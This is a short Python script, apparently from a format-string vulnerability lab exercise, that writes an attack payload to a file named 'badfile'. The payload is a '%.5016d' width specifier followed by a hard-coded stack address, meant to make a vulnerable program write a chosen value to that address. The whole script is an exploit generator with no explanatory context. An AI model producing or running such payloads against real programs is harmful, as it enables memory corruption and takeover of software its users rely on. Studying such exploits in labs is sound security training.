#!/usr/bin/python3
import sys

N = 300
content = bytearray(0x0 for i in range(N))

s = "%.5016d" + "\x9c\xd1\xff\xff"
fmt = (s).encode('latin-1')
with open('badfile', 'wb') as f:
	f.write(fmt)
